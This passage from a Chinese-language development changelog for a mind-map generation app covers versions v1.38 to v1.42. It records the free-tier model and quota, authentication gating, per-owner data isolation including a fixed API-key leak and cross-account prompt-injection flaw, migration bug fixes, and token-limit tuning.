只在响应头里才有意义，写进响应体标准客户端与中间层的重试逻辑都读不到。`login_attempts` 与 `users`/`sessions` 一起在 `repository.connect()` 里建，理由同：它的读点在登录请求上，那里"发现表不存在 → 建表"正好落在最不该慢的位置。基线 2530 → **后端 2549（另有 29 subtest）、前端 1039（64 文件，未变）**。 |
| v1.38 | 2026-11-23 | 免费档：动态发现 `:free` 模型（不写死名字）。`GET /provider/v1/models` 实测 22 秒/次，所以后台线程 + 1 小时 TTL，列表永不在请求路径上；`:free` 后缀 + `supported_endpoints` 含 `/chat/completions` 才算可用（12 个模型只支持 `/messages`）；排序按上下文降序、id 升序保证确定性；上游偶发 429 → 一次运行内按候选序列逐个试，判据 `UNAVAILABLE_STATUSES={429,502,503,504}` 只有一份（两条模型出口共用）；实测 `max_tokens=1400` 时 reasoning 吃光预算、正文空、56.9 秒 → 免费档发 `reasoning_effort=low` 并把 `max_tokens` 抬到 4000；开关 `MINDMAP_FREE_TIER` 默认关（关着时请求体逐字节不变），只影响借用部署方配置的人。顺手修掉一个只在失败路径上出现的坑：刷新失败没放 `_REFRESHING`，会让那个端点一小时内不再重试（表现为"免费档时好时坏、重启又好了"）。基线 2549 → 2575 后端 / 1039 前端。 |
| v1.39 | 2026-11-23 | 加公共免费额度：每 IP 每天 3 次，用完 429 不开流。`MINDMAP_FREE_TIER_API_KEY` 配了就有额度、本身就是开关；判据是`base_url_source ∈ {instance, env}` **且** `api_key_source ∈ {instance, env, unset}`，地址也必须由部署方选（只看"没有自己的密钥"会让任何人 PUT 一个地址就把公共钥匙领走，这正是 P0-1 的形状，本轮自查复现并修掉）。`quota.py` 用 `BEGIN IMMEDIATE` 在开流之前扣、无产出时 `refund()`、半棵树照扣、按本地日期跨天重置（部署要设 `TZ`）；降级方向是放开。接口层 `runs/stream` 新增 429 `free_quota_exhausted` + `Retry-After`，前端失败卡片按死重试并给"明天恢复 / 填自己的密钥"两条路。基线 2575 → 2617（后端）、1039 → 1040（前端）。 |
| v1.40 | 2026-11-23 | 最后一片：门禁 + 最小数据隔离 + 前端登录态。门禁是纯 ASGI 中间件（`backend/app/auth/gate.py`），白名单只有 `/api/health` 与 `/api/auth/*`，判据是「有身份」而不是「登录过」——游客 cookie 也算，新访客照样能用那 3 次免费生成；把 37 条路径各挂一个依赖的写法漏一条就是一个匿名口子，而漏的那条在评审里看不出来。**两个中间件的注册顺序是硬要求**（Starlette `add_middleware` 是 `insert(0)`，反了就是门禁跑在身份解析之前、整站 401，现象像部署坏了）；前端 `main.ts` 也必须先 `GET /auth/me` 拿游客 cookie 再挂载 `App`，否则挂载瞬间那批请求一起 401、表现为「一打开就报错、刷新一下又好了」。隔离：`mindmaps.owner` 读共享写限主，别人改给 403 `map_forbidden`（不是 404），老行 `owner=''` 为「无主」只有部署方能接管；`runs` 刻意只本人可见（导图是作品、run 是过程记录），别人的 `run_id` 返 404、`pending` 与 `applied` 都按 owner 过滤（否则能替别人标掉那一位，那条记录再也不会出现在他的「上次的结果」里）。前端：`stores/auth.ts` + `components/AuthPanel.vue`（放抽屉，低频动作不挤占顶栏三件），失败卡片新增 `auth_required` 一档（按死重试，给「刷新」而不是「重试」）。基线 2617 → 2653（后端）、1040 → 1055（前端，65 个文件）；真页面验收时发现两处只有界面能暴露的问题并一并修掉：登录提示原本写着"不再受游客额度的限制"（额度按 IP 计数、游客与账号共用，登录不会多出次数）、登出后停在"注册"模式（刚退出的人下次大概率是登录）。 |
| v1.41 | 2026-11-24 | **PR#27 评审之后的加固（两个 P0 都修完）**。① 测试连接这条一次请求内完成的密钥外送路：`PUT` 改地址再 `POST /model/test` 会被 `api_key_host` 绑定挡住，但**直接给 `/model/test` 一个别家地址**不经过 `resolve()` 的地址，已存密钥照样随 `Authorization` 送出去（实测：两个游客身份就能复现）。修法是"已存密钥只发往它绑定的主机"——`overrides.base_url` 非空且请求里没带密钥时，比 `store.bound_host(resolved)` 与 `store.host_of(base_url)`，不等就 400 `settings_key_unbound` 且**一个字节都不发**；带密钥来（BYOK）则放行。② 记忆与备注跨账号：`memory_items`/`user_prefs`/`style_profile`/`edit_events` 都加 `owner` 维度，`note.*` 是唯一会进 system prompt 的自由文本，别人能读能改等于能往你的生成里写指令（实测 A 写、B 读改删全部成功）。后台线程（总结）读不到 ContextVar，所以 owner 由请求侧显式一路传下去，`app/auth/owner.py` 把这条纪律写进 docstring。③ stream 入口按 owner：别人的 `run_id` 打流既不重放他的树、也不把他的行重开成自己的（`runs.begin()` 的重开 `UPDATE` 带 `AND owner = ?`），统一 404。④ 游客 cookie 签名：`<32 位 id>.<16 位 hmac>`，密钥从库路径派生（不引新 env），裸 id 与伪造值等价于没 cookie。⑤ `GET /api/prefs/{key}` 补上（之前命中 `PUT`/`DELETE` 那条路径被判 405，"资源存在但方法不行"与实情相反）。**迁移里连挖三个真 bug**：老表 `INSERT ... SELECT COALESCE(api_key_host)` 引用 main 老库没有的列（从 main 升级的部署第一次连接就抛，整个后端起不来）、迁移 DML 不 commit 导致"新表空 + 老表在"再搬一次空表（数据永久丢失）、`INSERT OR IGNORE` 连 `NOT NULL` 违规一起吞（老库 `deep_model` 为 NULL 时整行静默消失）。三个都补了真库用例与变异测试。基线 2653 → **后端 2680（另有 29 subtest）、前端 1055（65 文件，未变）**。 |
| v1.42 | 2026-11-24 | **免费档的 `max_tokens` 只设下限等于没设（线上撞 600 秒的根因）**。现象：生产开了免费档之后一次生成跑到 600.1 秒被 `budget_exhausted / max_seconds` 掐掉，而同一张图走付费 `z-ai/glm-5.3-flash` 只要 103.5 秒。根因不在"免费模型慢"，在`requested = max(requested, FREE_MIN_OUTPUT_TOKENS)`——调用方（`RunBudget.max_output_tokens` 默认 65536）要得比 4000 大，`max(65536, 4000)` 还是 65536，等于什么都没做。两个免费模型**按额度大小决定思考多久**：同一份提示词只改 `max_tokens`，4000 → 19.9 秒 / reasoning 508 / 正文 604 字，16000 → 36.3 秒 / 1262 / 1912 字，65536 → 87.7 秒 / 2123 / 1941 字；正文 1900 字左右就到顶，多出来的额度全花在思考上。整条 `mindmap_generate`（4 次调用）不限上限 **549.9 秒**、夹到 16000 **359.6 秒**。对照组说明这不是模型慢：付费 glm 对 `max_tokens` 完全不敏感（4000 与 65536 都是 9–10 秒、reasoning 30）。修法：新增 `FREE_MAX_OUTPUT_TOKENS = 16000` 并在**两条模型出口**（`generation/service.py::chat_async` 与 `agent/provider.py::_attempt`）都夹一次上限——只改一条会得到"agent 那轮限了、写内容那次没限"。为什么是 16000 不是 4000：一次结构调用实测要 1723–2712 字正文 + 最多 2052 reasoning，4000 会 `finish_reason=length` 被 `_clip_tree` 回收，代价是节点变少、用户看到缺分支的图。同一轮把 **524**（Cloudflare 源站超时）加进 `UNAVAILABLE_STATUSES`：免费模型一次响应能跑 180 秒以上，网关先撑不住，而这个状态原本不在集合里→ 不换候选、以一条"请检查服务配置"的假结论结束（配置本身是对的）。另外记下两个非本轮引入的既有事实：① 生产 env 原来既没 `MINDMAP_FREE_TIER` 也没 `MINDMAP_FREE_TIER_API_KEY`，所以游客一直在用付费 glm（本轮补齐并验证 `model_source=free` / `api_key_source=public`）；② ECS 上外部检索全失败，根因是 `knowledge/external.py` 的 `DEFAULT_PROXY=http://127.0.0.1:7897` 对着作者本机 Clash。基线 2680 → **后端 2683（另有 29 subtest）、前端 1055（65 文件，未变）**。评审之后又补了四条：流式路径也按 `UNAVAILABLE_STATUSES` 分类（原先 524 会被 `except Exception` 吃成"退回一次性请求"，多等一整个往返才得到同一个结论；`provider._attempt` 那边是先判再 `raise_for_status`，两条出口不一致）；`_max_tokens()`/`_nodes_per_call()` 补 `apply_free_tier_ceiling()`（免费档按 65536 反推批次容量，而实际只发 16000，规划量是真实容量的四倍多——目前只影响生产不可达的 `_generate_deep`，但挂回大图时会立刻生效）；`provider._parse_completion` 的 length 分支补注释说明"与 `chat_async` 的 salvage 有意不同"（参数缺一半执行了就是脏数据，没有"回收一半"这个选项）；`docs/DEPLOY.md` 那句"不跟随这个变量往上走"改准（往下是跟的）。基线 → **后端 2685、前端 1055（未变）**。 |
